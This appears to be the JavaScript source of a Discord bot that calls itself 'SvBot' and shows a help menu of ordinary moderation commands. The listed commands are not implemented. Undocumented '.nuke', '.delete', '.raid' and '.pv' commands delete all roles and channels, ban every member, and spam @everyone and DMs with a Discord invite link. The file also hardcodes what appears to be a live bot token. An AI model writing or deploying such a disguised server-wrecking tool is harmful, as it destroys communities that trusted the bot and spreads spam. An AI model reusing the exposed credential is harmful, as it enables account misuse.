
const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log("es")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `SvBot :) | .help` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("." + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Nowy serwer | https://discord.gg/teGj7mxvyP"));
}
if(msg.content.toLowerCase().startsWith("." + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("." + "pv")){
    msg.guild.members.cache.forEach(member => {
      if (member.id != client.user.id && !member.user.bot) member.send("text");
    });
}
if(msg.content.toLowerCase().startsWith("." + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "SvBot | ." },
            description: ".help - lista komend oraz ich funkcje. \n .ban @user - banuje wyznaczona osobe \n .kick @user - kickuje wyznaczona osobe \n .warn @user - warnuje wyznaczona osobe. \n .clear ilosc - usuwa wiadomosci. \n .iq - sprawdz ile masz iq! \n Wiekszosc tych komend jest jeszcze w fazie kreacji, jest koncept! \n by SvBot"
        }
    })
}
if(msg.content.toLowerCase().startsWith("." + "raid")){
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
	msg.channel.send("@everyone Nowy serwer | https://discord.gg/teGj7mxvyP")
}
});

nuke.login("Nzk4NTUxNjAzNjUyOTg0ODcz.X_2rIg.D1L6MUNWYFP2aawKk1Lq0cWrZYE");